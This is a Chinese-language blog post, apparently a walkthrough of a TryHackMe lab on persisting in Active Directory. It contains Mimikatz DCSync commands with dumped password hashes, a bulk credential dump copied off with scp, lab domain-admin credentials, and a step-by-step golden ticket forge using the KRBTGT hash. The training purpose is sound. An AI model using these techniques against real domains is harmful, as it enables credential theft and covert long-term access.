<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>THM-Persisting Active Directory | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>THM-Persisting Active Directory</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-02-19T08:44:35.051Z" id="date"> 2024-02-19</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-02-27T09:30:17.405Z" id="updated"> 2024-02-27</time></div></span><br><span>文章总字数: <div class="control">8k</div></span><br><span>预计阅读时间: <div class="control">32 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 简介</h1>
<p>该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的位置，我们需要确保我们部署持久性以确保蓝队不能直接把我们踢出去。在此网络中，我们将探索可用于在 AD 中持久化的几种不同方法。</p>
<h2 id="AD-维持"><a href="#AD-维持" class="headerlink" title="AD-维持"></a>AD 维持</h2>
<p>在攻击 AD 的过程中，我们需要确保部署持久性。这将确保蓝队无法通过简单地轮换一些凭证来将我们踢出局。如前所述，AD 的破坏过程是循环的。当我们损害 AD 财产时，我们会部署持久性，而不仅仅是在最后。这确保了如果我们的一个位置被蓝队烧毁，我们有几个后备方案。在此持久阶段，我们将使用多种技术来确保我们获得的访问权限不会被简单地撤销。这些持久性技术取决于我们迄今为止获得的特定权限和特权。</p>
<p class='item-img' data-src='C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240219164819837.png'><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240219164819837.png" alt="image-20240219164819837"></p>
<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2>
<p>在这个网络中，我们将介绍几种可用于在 AD 中持久化的方法。这绝不是一个完整的列表，因为可用的方法通常是高度情境化的，并且依赖于 AD 结构和环境。但是，我们将介绍以下持久 AD 技术：</p>
<ul>
<li>AD 凭据和 DCSync-ing</li>
<li>银票和金票</li>
<li>AD Certificates</li>
<li>AD 安全标识符 (SID)</li>
<li>Access Control Lists 访问控制列表</li>
<li>组策略对象 (GPO)</li>
</ul>
<h2 id="索取您的凭证"><a href="#索取您的凭证" class="headerlink" title="索取您的凭证"></a>索取您的凭证</h2>
<p>为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，在攻击箱上导航至 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.loc/creds">http://distributor.za.tryhackme.loc/creds</a> 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。</p>
<p>此凭据对将为您提供对 THMWRK1.za.tryhackme.loc 的 RDP 和 SSH 访问权限。 THMWRK1 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。跳转主机经常成为红队的目标，因为它们提供对新网段的访问。您可以使用 Remmina 或任何其他类似的远程桌面客户端连接到该主机以进行 RDP。连接时记得指定za.tryhackme.loc的域名。</p>
<p>对于 SSH 访问，您可以使用以下 SSH 命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssh za\\colin<span class="hljs-selector-class">.lane</span><span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc<br>  // Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: colin.lane <span class="hljs-attribute">Password</span>: Arrangement2012 <br></code></pre></td></tr></table></figure>
<p>出现提示时，提供您帐户的关联密码。尽管 RDP 可用于所有任务，但 SSH 速度更快。</p>
<h1>0x02 通过凭证进行持久化</h1>
<h2 id="恭喜你"><a href="#恭喜你" class="headerlink" title="恭喜你"></a>恭喜你</h2>
<p>恭喜疲惫的旅行者！在突破 AD、执行枚举并一路利用它到顶部（如果你按顺序完成了这些 AD 网络）之后，你终于到达了持久性的酒馆。艰苦的工作已经结束，现在是时候享受一些乐趣了。虽然 AD 持久性仍然是一件严肃的事情，但它确实不像其他阶段那么有压力。在这里我们可以尽情发挥我们的创造力。所以，在我们的小酒馆里休息一下您疲惫的骨头，给自己泡一杯好茶，然后我们就开始吧。</p>
<p>连同您的低特权凭据，您将获得域管理员凭据。多么幸运啊！在讨论持久性技术时，您将使用特权凭据对低特权凭据集执行持久性技术。记下以下 DA 帐户：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">Username: `Administrator` 用户名： `Administrator`<br><br>Password: `tryhackmewouldnotguess1@` 密码： `tryhackmewouldnotguess1@`<br><br>Domain: `ZA` 域： `ZA`<br></code></pre></td></tr></table></figure>
<p>由于我们为您提供对整个域的完全访问权限，因此我们无法真正隐藏任何标志或强迫您确保在回答问题之前自己执行这些持久性技术。不过，我们鼓励您花时间尝试这些方法，因为当蓝队开始将您踢出局时，它们将作为红队评估的回报。</p>
<p>我们将讨论的第一个也是最不可靠的持久性技术是凭证。前面讨论的一些横向技术可能会导致攻击者获得凭证的访问权限。当使用“凭据”一词时，它可能意味着用户名和密码对，但在 AD 上下文中，即使是密码哈希也足以通过哈希传递技术进行身份验证。</p>
<h2 id="DC-Sync（同步）"><a href="#DC-Sync（同步）" class="headerlink" title="DC-Sync（同步）"></a>DC Sync（同步）</h2>
<p>在大型组织中，每个域只有一个域控制器是不够的。这些域通常在多个区域位置使用，并且拥有单个 DC 会显着延迟 AD 中的任何身份验证服务。因此，这些组织使用多个 DC。那么问题就变成了，您如何在两个不同的办公室使用相同的凭据进行身份验证？</p>
<p>这个问题的答案是域复制。每个域控制器都运行一个称为知识一致性检查器 (KCC) 的进程。 KCC为AD林生成复制拓扑，并通过远程过程调用（RPC）自动连接到其他域控制器以同步信息。这包括更新的信息，例如用户的新密码和新对象，例如创建新用户的时间。这就是为什么您在更改密码后通常必须等待几分钟才能进行身份验证，因为发生密码更改的 DC 可能与您进行身份验证的 DC 不同。</p>
<p>复制过程称为 DC 同步。不仅仅是 DC 可以启动复制。属于域管理员组的帐户也可以出于合法目的（例如创建新的域控制器）执行此操作。</p>
<p>一种流行的攻击是 DC 同步攻击。如果我们有权访问具有域复制权限的帐户，我们可以发起 DC 同步攻击以从 DC 获取凭据。</p>
<h2 id="并非所有凭证都是一样的"><a href="#并非所有凭证都是一样的" class="headerlink" title="并非所有凭证都是一样的"></a>并非所有凭证都是一样的</h2>
<p>在开始 DC 同步攻击之前，我们首先讨论一下我们可能会寻找哪些凭据。虽然我们应该始终寻求转储特权凭据，例如域管理员组成员的凭据，但这些也是首先要轮换的凭据（蓝队术语，意思是重置帐户密码）。因此，如果我们只有特权凭证，可以肯定地说，一旦蓝队发现我们，他们就会轮换这些帐户，我们可能会失去访问权限。</p>
<p>那么我们的目标就是坚持拥有接近特权的凭证。我们并不总是需要王国的完整钥匙；我们只需要足够的钥匙来确保我们仍然能够实现目标执行并始终让蓝队保持警惕。因此，我们应该尝试通过如下凭证来持久保存：</p>
<ul>
<li>在多台计算机上具有本地管理员权限的凭据。通常，组织有一两个对几乎所有计算机具有本地管理权限的组。这些组通常分为一组用于工作站，一组用于服务器。通过获取这些团体成员的凭据，我们仍然可以访问该庄园中的大部具有委派权限的服务帐户。有了这些账户，我们就能够强制金票和银票执行 Kerberos 委托攻击。</li>
<li>用于特权 AD 服务的帐户。如果我们泄露了特权服务（例如 Exchange、Windows Server Update Services (WSUS) 或 System Center Configuration Manager (SCCM)）的帐户，我们可以利用 AD 漏洞再次获得特权立足点。</li>
</ul>
<p>当谈到要转储和保留哪些凭证时，它受到很多因素的影响。您必须发挥创意并根据具体情况进行思考。然而，对于这个房间，我们将享受一些乐趣，让蓝队流汗，并放弃我们能得到的每一份凭证！</p>
<h2 id="DC同步全部"><a href="#DC同步全部" class="headerlink" title="DC同步全部"></a>DC同步全部</h2>
<p>我们将使用 Mimikatz 来获取凭证。使用 DA 帐户通过 SSH 登录 THMWRK1 并加载 Mimikatz：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225161004725.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225161004725.png" alt="image-20240225161004725"></p>
<p>让我们首先对我们自己的单个帐户执行 DC 同步：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:louis.cole <br>[DC] <span class="hljs-string">&#x27;za.tryhackme.loc&#x27;</span> will be the domain <br>[DC] <span class="hljs-string">&#x27;THMDC.za.tryhackme.loc&#x27;</span> will be the DC server <br>[DC] <span class="hljs-string">&#x27;louis.cole&#x27;</span> will be the user account<br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>) <br><br>Object RDN           : louis.cole <br><br>** SAM ACCOUNT **<br><br>SAM Username         : louis.cole<br>Account Type         : <span class="hljs-number">30000000</span> ( USER_OBJECT ) <br>User Account Control : <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )<br>Account expiration   :<br>Password last change : <span class="hljs-number">4</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">30</span>:<span class="hljs-number">03</span> PM <br>Object Security ID   : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1120</span><br>Object Relative ID   : <span class="hljs-number">1120</span><br><br>Credentials:<br>  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc <br>    ntlm- <span class="hljs-number">0</span>: fbdcd5041c96ddbd82224270b57f11fc<br>    lm  - <span class="hljs-number">0</span>: d40bfd7d451f6f58d12ff18ccab7e820<br><br>Supplemental Credentials:<br>* Primary:NTLM-Strong-NTOWF *<br>    Random Value : <span class="hljs-number">474</span>acb706d53bbdb880e1dd75bc4ba8d <br><br>* Primary:Kerberos-Newer-Keys *<br>    Default Salt : ZA.TRYHACKME.LOClouis.cole <br>    Default Iterations : <span class="hljs-number">4096</span><br>    Credentials<br>      aes256_hmac       (<span class="hljs-number">4096</span>) : c069badc39ba1027c18b4833b4c25491f298a79e99eb227d44d0617b84a0b534 <br>      aes128_hmac       (<span class="hljs-number">4096</span>) : <span class="hljs-number">9</span>b07abcdc3c080f9d0a5cadfe2f6e244<br>      des_cbc_md5       (<span class="hljs-number">4096</span>) : <span class="hljs-number">408920</span>ec6426da52<br><br>* Primary:Kerberos * <br>    Default Salt : ZA.TRYHACKME.LOClouis.cole<br>    Credentials<br>      des_cbc_md5       : <span class="hljs-number">408920</span>ec6426da52 <br><br>* Packages *<br>    NTLM-Strong-NTOWF<br><br>* Primary:WDigest *<br>    <span class="hljs-number">01</span>  c9ec818441c8c6df6d1d831a0c6771af<br>    <span class="hljs-number">02</span>  <span class="hljs-number">4708</span>f92952296eaa3d4b6553309843d6<br>    <span class="hljs-number">03</span>  <span class="hljs-number">350</span>a3aa15bbab0697e93497f67d83114<br>    <span class="hljs-number">04</span>  c9ec818441c8c6df6d1d831a0c6771af <br>    <span class="hljs-number">05</span>  <span class="hljs-number">4708</span>f92952296eaa3d4b6553309843d6<br>    <span class="hljs-number">06</span>  a95cc2cd2e9193f72632108e6ff4a361<br>    <span class="hljs-number">07</span>  c9ec818441c8c6df6d1d831a0c6771af<br>	.....<br></code></pre></td></tr></table></figure>
<p>您将看到相当多的输出，包括您帐户当前的 NTLM 哈希值。您可以通过使用此类网站将您的密码转换为 NTLM 哈希来验证 NTLM 哈希是否正确。</p>
<p>这很棒，但我们希望 DC 同步每个帐户。为此，我们必须在 Mimikatz 上启用日志记录：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225173127135.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225173127135.png" alt="image-20240225173127135"></p>
<p>确保将<username>更改为您的用户名，以免覆盖其他用户的日志转储。现在，我们将使用 /all 标志，而不是指定我们的帐户：</username></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">lsadump::dcsync /domain:za.tryhackme.loc /all<br></code></pre></td></tr></table></figure>
<p>这将需要一些时间才能完成。完成后，退出 Mimikatz 以完成转储查找，然后您可以下载 _dcdump.txt 文件。您可以使用 <code>cat &lt;username&gt;_dcdump.txt | grep &quot;SAM Username&quot;</code> 恢复所有用户名，使用 <code>cat &lt;username&gt;_dcdump.txt | grep &quot;Hash NTLM&quot;</code> 恢复所有哈希值。现在，我们可以执行离线密码破解攻击来恢复纯文本凭证，或者简单地使用 Mimikatz 执行哈希传递攻击。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">scp Administrator<span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.<span class="hljs-attribute">loc</span>:<span class="hljs-attribute">C</span>:/Tools/mimikatz_trunk/x64/hybcx_dcdump.txt .<br>    //密码:tryhackmewouldnotguess1@<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174655287.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174655287.png" alt="image-20240225174655287"></p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174648043.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174648043.png" alt="image-20240225174648043"></p>
<h1>0x03 通过票据持久化</h1>
<p>正如前面任务中所讨论的，我们经常希望通过具有委派权限的服务帐户来持久化伪造银票和金票。但这些到底是什么，为什么每次蓝队桌面演习结束时都会有人大喊：“冲掉所有金票和银票！”。</p>
<h2 id="巧克力工厂门票"><a href="#巧克力工厂门票" class="headerlink" title="巧克力工厂门票"></a>巧克力工厂门票</h2>
<p>在讨论金票和银票之前，我们首先需要快速回顾一下 Kerberos 身份验证。下图显示了 Kerberos 身份验证的正常流程：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226163153951.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226163153951.png" alt="image-20240226163153951"></p>
<p>用户在 DC 上向密钥分发中心（KDC）发出 AS-REQ 请求，其中包括使用用户的 NTLM 散列加密的时间戳。本质上，这是请求一个票据授予票据（TGT）。DC 检查信息并将 TGT 发送给用户。这个 TGT 使用仅存储在 DC 上的 KRBTGT 帐户的密码哈希进行签名。现在，用户可以将这个 TGT 发送给 DC，以请求对用户想要访问的资源的票据授予服务（TGS）。如果 TGT 检查通过，DC 将响应 TGS，该 TGS 使用用户请求访问的服务的 NTLM 散列加密。然后用户将这个 TGS 提交给服务进行访问，服务可以验证 TGS，因为它知道自己的散列并可以授予用户访问权限。</p>
<p>说了所有这些背景理论后，是时候研究一下金票和银票了。</p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2>
<p>金票是伪造的 TGT。这意味着我们绕过上图中的步骤 1 和 2，向 DC 证明我们是谁。拥有特权帐户的有效 TGT，我们现在可以为几乎任何我们想要的服务请求 TGS。为了伪造金票，我们需要 KRBTGT 帐户的密码哈希，以便我们可以为我们想要的任何用户帐户签署 TGT。关于金票的一些有趣的说明：</p>
<ul>
<li>
<p>通过在 Kerberos 进程的此阶段进行注入，我们不需要要模拟的帐户的密码哈希，因为我们绕过了该步骤。 TGT仅用于证明DC上的KDC对其进行了签名。由于它是由 KRBTGT 哈希签名的，因此该验证通过，并且无论其内容如何，​​TGT 都被声明为有效。</p>
</li>
<li>
<p>说到内容，KDC 只会验证 TGT 中指定的用户帐户（如果该帐户早于 20 分钟）。这意味着我们可以将禁用、删除或不存在的帐户放入 TGT，只要我们确保时间戳不超过 20 分钟，它就有效。</p>
</li>
<li>
<p>由于票证的策略和规则是在 TGT 本身中设置的，因此我们可以覆盖 KDC 推送的值，例如票证只能在 10 小时内有效。例如，我们可以确保我们的 TGT 有效期为 10 年，从而赋予我们持久性。</p>
</li>
<li>
<p>默认情况下，KRBTGT 帐户的密码永远不会更改，这意味着一旦我们拥有密码，除非手动轮换，否则我们可以通过永久生成 TGT 来获得持久访问权限。</p>
</li>
<li>
<p>蓝队必须将 KRBTGT 帐户的密码轮换两次，因为当前密码和以前的密码对该帐户仍然有效。这是为了确保密码的意外轮换不会影响服务。</p>
</li>
<li>
<p>轮换 KRBTGT 帐户的密码对于蓝队来说是一项非常痛苦的过程，因为这将导致环境中的大量服务停止工作。他们可能认为自己拥有一个有效的 TGT，有时甚至会持续几个小时，但那个 TGT 已经失效了。并非所有的服务都足够智能，能够在 TGT 失效后释放它（因为时间戳仍然有效），因此它们不会自动请求一个新的 TGT。</p>
</li>
<li>
<p>黄金票据甚至可以让您绕过智能卡验证，因为在创建 TGT 之前，智能卡是由 DC 验证的。</p>
</li>
</ul>
<p>除了 KRBTGT 帐户的密码哈希之外，我们只需要域名、域 SID 和我们想要模拟的人的用户 ID。如果我们处于可以恢复 KRBTGT 帐户密码哈希的位置，那么我们已经处于可以恢复其他所需信息的位置了。</p>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2>
<p>银票是伪造的 TGS 票。因此，现在，我们跳过与 DC 上的 K DC 进行的所有通信（上图中的步骤 1-4），而只与我们想要直接访问的服务进行交互。关于银票的一些有趣的说明：</p>
<ul>
<li>
<p>生成的 TGS 由我们目标主机的机器帐户签名。</p>
</li>
<li>
<p>金票和银票之间的主要区别在于我们获得的特权数量。如果我们拥有 KRBTGT 帐户的密码哈希值，我们就可以访问所有内容。使用银票，由于我们只能访问我们正在攻击的服务器的计算机帐户的密码哈希，因此我们只能模拟该主机本身的用户。银票的范围仅限于特定服务器上的任何服务。</p>
</li>
<li>
<p>由于 TGS 是伪造的，所以没有关联的 TGT，这意味着 DC 从未被联系过。这使得攻击非常危险，因为唯一可用的日志将在目标服务器上。因此，虽然范围更有限，但对于蓝队来说，检测起来要困难得多。</p>
</li>
<li>
<p>由于权限是通过 SID 确定的，因此我们可以再次为银票证创建一个不存在的用户，只要我们确保该票证具有将用户置于主机的本地管理员组中的相关 SID。</p>
</li>
<li>
<p>机器帐户的密码通常每 30 天轮换一次，这不利于持久性。但是，我们可以利用 TGS 提供的访问权限来访问主机注册表并更改负责机器帐户密码轮换的参数。从而确保机器帐户保持静态并授予我们在机器上的持久性。</p>
</li>
<li>
<p>虽然只能访问单个主机可能看起来是一个显著的降级，但机器帐户可以像普通的AD帐户一样使用，不仅允许您对主机进行管理员访问，还可以继续像使用AD用户帐户一样枚举和利用AD。</p>
</li>
</ul>
<h2 id="伪造门票以获取乐趣和利润"><a href="#伪造门票以获取乐趣和利润" class="headerlink" title="伪造门票以获取乐趣和利润"></a>伪造门票以获取乐趣和利润</h2>
<p>现在我们已经解释了金票和银票的基础知识，让我们生成一些。您将需要 KRBTGT 帐户的 NTLM 哈希值，由于在上一个任务中执行了 DC 同步，您现在应该拥有该哈希值。此外，记下与 THMSERVER1 计算机帐户关联的 NTLM 哈希值，因为我们需要这个哈希值作为银票。您可以在执行的 DC 转储中找到此信息。我们需要的最后一条信息是域 SID。使用 THMWRK1 上的低特权 SSH 终端，我们可以使用 AD-RSAT cmdlet 来恢复此信息：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssh za\\phillip<span class="hljs-selector-class">.wilkins</span><span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc  <br> //Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: phillip.wilkins <span class="hljs-attribute">Password</span>: Developmental1971<br></code></pre></td></tr></table></figure>
<p>输入以下命令获取到相关信息</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs scss">PS C:\Users\phillip.wilkins&gt; Get-ADDomain <br><br><br>AllowedDNSSuffixes                 : &#123;&#125;<br>ChildDomains                       : &#123;&#125;<br>ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc       <br>DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc <br>DistinguishedName                  : DC=za,DC=tryhackme,DC=loc<br>DNSRoot                            : za.tryhackme.loc<br>DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc<br>DomainMode                         : Windows2012R2Domain<br>DomainSID                          : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span><br>ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc<br>Forest                             : tryhackme.loc<br>InfrastructureMaster               : THMDC.za.tryhackme.loc<br>LastLogonReplicationInterval       :<br>LinkedGroupPolicyObjects           : &#123;CN=&#123;<span class="hljs-number">31</span>B2F340-<span class="hljs-number">016</span>D-<span class="hljs-number">11</span>D2-<span class="hljs-number">945</span>F-<span class="hljs-number">00</span>C04FB984F9&#125;,CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc&#125;<br>LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc<br>ManagedBy                          :<br>Name                               : za<br>NetBIOSName                        : ZA<br>ObjectClass                        : domainDNS<br>ObjectGUID                         : <span class="hljs-number">1</span>fc9e299-da51-<span class="hljs-number">4</span>d03-baa0-<span class="hljs-number">862</span>c3360c0b2<br>ParentDomain                       : tryhackme.loc<br>PDCEmulator                        : THMDC.za.tryhackme.loc<br>PublicKeyRequiredPasswordRolling   :<br>QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc<br>ReadOnlyReplicaDirectoryServers    : &#123;&#125; <br>ReplicaDirectoryServers            : &#123;THMDC<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>&#125;<br>RIDMaster                          : THMDC.za.tryhackme.loc<br>SubordinateReferences              : &#123;DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc&#125;<br>SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc<br>UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc<br></code></pre></td></tr></table></figure>
<p>现在我们已经拥有了所有必需的信息，我们可以重新启动 Mimikatz：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164724770.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164724770.png" alt="image-20240226164724770"></p>
<p>加载 Mimikatz 后，执行以下操作以生成黄金票证：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:<span class="hljs-number">500</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span> /krbtgt:<span class="hljs-number">16</span>f9af38fca3ada405386b3b57366082 /endin:<span class="hljs-number">600</span> /renewmax:<span class="hljs-number">10080</span> /ptt<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164909614.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164909614.png" alt="image-20240226164909614"></p>
<p>参数解释：</p>
<ul>
<li>/admin - 我们要模拟的用户名。这不必是有效用户。</li>
<li>/domain - 我们要为其生成票证的域的 FQDN。</li>
<li>/id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。</li>
<li>/sid - 我们要为其生成票证的域的 SID。</li>
<li>/krbtgt - KRBTGT 帐户的 NTLM 哈希值。</li>
<li>/endin - 票证有效期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是10小时（600分钟）</li>
<li>/renewmax - 续订的最长票证生命周期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是7天（10080分钟）</li>
<li>/ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。</li>
</ul>
<p>我们可以通过对域控制器运行 dir 命令来验证黄金票证是否正常工作：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">dir \\thmdc<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\c$\<br></code></pre></td></tr></table></figure>
<p>在这里我又另起了一个ssh会话，接着输入以上命令发现没有权限</p>
